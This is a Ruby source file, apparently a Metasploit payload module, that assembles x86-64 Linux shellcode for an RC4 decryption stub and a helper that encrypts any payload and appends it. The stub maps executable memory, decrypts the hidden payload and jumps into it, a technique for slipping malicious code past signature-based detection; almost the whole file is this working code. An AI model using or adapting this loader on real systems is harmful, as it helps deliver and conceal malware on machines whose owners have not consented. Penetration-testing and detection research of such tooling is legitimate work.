module Msf::Payload::Linux::X64::Rc4Decrypter

  STUB_KEY_SIZE_OFFSET = 0x0f8
  STUB_PAYLOAD_SIZE_OFFSET = 0x100
  STUB_ENCRYPTED_SIZE_OFFSET = 0x108
  STUB_KEY_DATA_OFFSET = 0x110
  STUB_ENCRYPTED_DATA_OFFSET = 0x210

  def rc4_decrypter_stub
    stub = ""

    # === PART 1: Get base address and MMAP ===
    # 0x00: lea r12, [rip-7]              ; r12 = base address
    stub << [0x258d4c].pack('V')[0,3]
    stub << [0xfffffff9].pack('V')
    # 0x07: mov rsi, [r12+0x100]          ; rsi = payload_size
    stub << [0x24b48b49].pack('V')
    stub << [STUB_PAYLOAD_SIZE_OFFSET].pack('V')
    # 0x0f: xor edi, edi                  ; addr = NULL
    stub << [0xff31].pack('v')
    # 0x11: mov edx, 7                    ; prot = PROT_RWX
    stub << [0x07ba].pack('v')
    stub << [0x0000].pack('v')
    stub << [0x00].pack('C')
    # 0x16: mov r10d, 0x22                ; flags = MAP_PRIVATE|MAP_ANON
    stub << [0xba41].pack('v')
    stub << [0x00000022].pack('V')
    # 0x1c: mov r8d, -1                   ; fd = -1
    stub << [0xb841].pack('v')
    stub << [0xffffffff].pack('V')
    # 0x22: xor r9d, r9d                  ; offset = 0
    stub << [0x3145].pack('v')
    stub << [0xc9].pack('C')
    # 0x25: mov eax, 9                    ; syscall = mmap
    stub << [0xb8].pack('C')
    stub << [0x00000009].pack('V')
    # 0x2a: syscall
    stub << [0x050f].pack('v')
    # 0x2c: mov r13, rax                  ; save mmap result
    stub << [0x8949].pack('v')
    stub << [0xc5].pack('C')

    # === PART 2: Initialize S-box (256 bytes) on stack ===
    # 0x2f: sub rsp, 256                  ; allocate S-box
    stub << [0x8148].pack('v')
    stub << [0xec].pack('C')
    stub << [0x00000100].pack('V')
    # 0x36: mov rdi, rsp                  ; rdi = S-box pointer
    stub << [0x8948].pack('v')
    stub << [0xe7].pack('C')
    # 0x39: xor ecx, ecx                  ; i = 0
    stub << [0xc931].pack('v')
    # S-box init loop: S[i] = i for i = 0..255
    # 0x3b: mov [rdi+rcx], cl             ; S[i] = i
    stub << [0x0c88].pack('v')
    stub << [0x0f].pack('C')
    # 0x3e: inc ecx                       ; i++
    stub << [0xc1ff].pack('v')
    # 0x40: cmp ecx, 256
    stub << [0xf981].pack('v')
    stub << [0x00000100].pack('V')
    # 0x46: jne 0x3b                      ; loop until i == 256
    stub << [0xf375].pack('v')

    # === PART 3: RC4 Key Scheduling Algorithm (KSA) ===
    # 0x48: lea r8, [r12+0x110]           ; r8 -> key_data
    stub << [0x848d4d].pack('V')[0,3]
    stub << [0x24].pack('C')
    stub << [STUB_KEY_DATA_OFFSET].pack('V')
    # 0x50: mov r9d, [r12+0xf8]           ; r9 = key_size
    stub << [0x8c8b45].pack('V')[0,3]
    stub << [0x24].pack('C')
    stub << [STUB_KEY_SIZE_OFFSET].pack('V')
    # 0x58: xor ecx, ecx                  ; i = 0
    stub << [0xc931].pack('v')
    # 0x5a: xor edx, edx                  ; j = 0
    stub << [0xd231].pack('v')

    # KSA loop: for i = 0..255
    # 0x5c: movzx eax, byte [rdi+rcx]     ; eax = S[i]
    stub << [0xb60f].pack('v')
    stub << [0x0f04].pack('v')
    # 0x60: add edx, eax                  ; j += S[i]
    stub << [0xc201].pack('v')
    # 0x62: mov eax, ecx                  ; eax = i
    stub << [0xc889].pack('v')
    # mod_loop:
    # 0x64: cmp eax, r9d                  ; compare with key_size
    stub << [0x3944].pack('v')
    stub << [0xc8].pack('C')
    # 0x67: jb mod_done
    stub << [0x0572].pack('v')
    # 0x69: sub eax, r9d                  ; i % key_size via subtraction
    stub << [0x2944].pack('v')
    stub << [0xc8].pack('C')
    # 0x6c: jmp mod_loop
    stub << [0xf6eb].pack('v')
    # mod_done:
    # 0x6e: movzx eax, byte [r8+rax]      ; eax = key[i % key_size]
    stub << [0xb60f41].pack('V')[0,3]
    stub << [0x0004].pack('v')
    # 0x73: add edx, eax                  ; j += key[i % key_size]
    stub << [0xc201].pack('v')
    # 0x75: and edx, 0xff                 ; j &= 0xFF
    stub << [0xe281].pack('v')
    stub << [0x000000ff].pack('V')
    # swap S[i] and S[j]:
    # 0x7b: movzx eax, byte [rdi+rcx]     ; eax = S[i]
    stub << [0xb60f].pack('v')
    stub << [0x0f04].pack('v')
    # 0x7f: movzx r10d, byte [rdi+rdx]    ; r10 = S[j]
    stub << [0xb60f44].pack('V')[0,3]
    stub << [0x1714].pack('v')
    # 0x84: mov [rdi+rcx], r10b           ; S[i] = S[j]
    stub << [0x8844].pack('v')
    stub << [0x0f14].pack('v')
    # 0x88: mov [rdi+rdx], al             ; S[j] = S[i]
    stub << [0x0488].pack('v')
    stub << [0x17].pack('C')
    # 0x8b: inc ecx                       ; i++
    stub << [0xc1ff].pack('v')
    # 0x8d: cmp ecx, 256
    stub << [0xf981].pack('v')
    stub << [0x00000100].pack('V')
    # 0x93: jne 0x5c                      ; loop until i == 256
    stub << [0xc775].pack('v')

    # === PART 4: RC4 Pseudo-Random Generation Algorithm (PRGA) ===
    # 0x95: lea r8, [r12+0x210]           ; r8 -> encrypted_data
    stub << [0x848d4d].pack('V')[0,3]
    stub << [0x24].pack('C')
    stub << [STUB_ENCRYPTED_DATA_OFFSET].pack('V')
    # 0x9d: mov r9d, [r12+0x108]          ; r9 = encrypted_size
    stub << [0x8c8b45].pack('V')[0,3]
    stub << [0x24].pack('C')
    stub << [STUB_ENCRYPTED_SIZE_OFFSET].pack('V')
    # 0xa5: xor ecx, ecx                  ; i = 0
    stub << [0xc931].pack('v')
    # 0xa7: xor edx, edx                  ; j = 0
    stub << [0xd231].pack('v')
    # 0xa9: xor r10d, r10d                ; k = 0 (byte counter)
    stub << [0x3145].pack('v')
    stub << [0xd2].pack('C')

    # PRGA loop: for k = 0..encrypted_size-1
    # 0xac: inc ecx                       ; i = (i + 1)
    stub << [0xc1ff].pack('v')
    # 0xae: and ecx, 0xff                 ; i &= 0xFF
    stub << [0xe181].pack('v')
    stub << [0x000000ff].pack('V')
    # 0xb4: movzx eax, byte [rdi+rcx]     ; eax = S[i]
    stub << [0xb60f].pack('v')
    stub << [0x0f04].pack('v')
    # 0xb8: add edx, eax                  ; j += S[i]
    stub << [0xc201].pack('v')
    # 0xba: and edx, 0xff                 ; j &= 0xFF
    stub << [0xe281].pack('v')
    stub << [0x000000ff].pack('V')
    # swap S[i] and S[j]:
    # 0xc0: movzx eax, byte [rdi+rcx]     ; eax = S[i]
    stub << [0xb60f].pack('v')
    stub << [0x0f04].pack('v')
    # 0xc4: movzx r11d, byte [rdi+rdx]    ; r11 = S[j]
    stub << [0xb60f44].pack('V')[0,3]
    stub << [0x171c].pack('v')
    # 0xc9: mov [rdi+rcx], r11b           ; S[i] = S[j]
    stub << [0x8844].pack('v')
    stub << [0x0f1c].pack('v')
    # 0xcd: mov [rdi+rdx], al             ; S[j] = S[i]
    stub << [0x0488].pack('v')
    stub << [0x17].pack('C')
    # keystream byte and XOR:
    # 0xd0: add eax, r11d                 ; eax = S[i] + S[j]
    stub << [0x0144].pack('v')
    stub << [0xd8].pack('C')
    # 0xd3: and eax, 0xff                 ; eax &= 0xFF
    stub << [0x25].pack('C')
    stub << [0x000000ff].pack('V')
    # 0xd8: movzx eax, byte [rdi+rax]     ; eax = S[(S[i]+S[j]) & 0xFF]
    stub << [0xb60f].pack('v')
    stub << [0x0704].pack('v')
    # 0xdc: xor al, [r8+r10]              ; al ^= encrypted[k]
    stub << [0x3243].pack('v')
    stub << [0x1004].pack('v')
    # 0xe0: mov [r13+r10], al             ; output[k] = decrypted
    stub << [0x8843].pack('v')
    stub << [0x1544].pack('v')
    stub << [0x00].pack('C')
    # 0xe5: inc r10d                      ; k++
    stub << [0xff41].pack('v')
    stub << [0xc2].pack('C')
    # 0xe8: cmp r10d, r9d                 ; compare k with size
    stub << [0x3945].pack('v')
    stub << [0xca].pack('C')
    # 0xeb: jne 0xac                      ; loop until k == encrypted_size
    stub << [0xbf75].pack('v')

    # === PART 5: Cleanup and jump ===
    # 0xed: add rsp, 256                  ; restore stack
    stub << [0x8148].pack('v')
    stub << [0xc4].pack('C')
    stub << [0x00000100].pack('V')
    # 0xf4: jmp r13                       ; jump to decrypted payload
    stub << [0xff41].pack('v')
    stub << [0xe5].pack('C')

    # Pad to data section
    stub << ("\x90" * (STUB_KEY_SIZE_OFFSET - stub.length))

    # Data section placeholders
    stub << ("\x00" * 8)    # key_size at 0xf8
    stub << ("\x00" * 8)    # payload_size at 0x100
    stub << ("\x00" * 8)    # encrypted_size at 0x108
    stub << ("\x00" * 256)  # key_data at 0x110

    stub
  end

  def rc4_decrypter(opts = {})
    key = opts[:key] || Rex::Text.rand_text(16)
    payload = opts[:data] || raise(ArgumentError, "Encrypted data required")

    encrypted_data = Rex::Crypto::Rc4.rc4(key, payload)
    payload_size = encrypted_data.length

    stub = rc4_decrypter_stub.dup

    stub[STUB_KEY_SIZE_OFFSET, 8] = [key.length].pack('Q<')
    stub[STUB_PAYLOAD_SIZE_OFFSET, 8] = [payload.length].pack('Q<')
    stub[STUB_ENCRYPTED_SIZE_OFFSET, 8] = [encrypted_data.length].pack('Q<')

    stub[STUB_KEY_DATA_OFFSET, 256] = key.ljust(256, "\x00")

    stub + encrypted_data
  end

  def stub_size
    STUB_ENCRYPTED_DATA_OFFSET
  end

end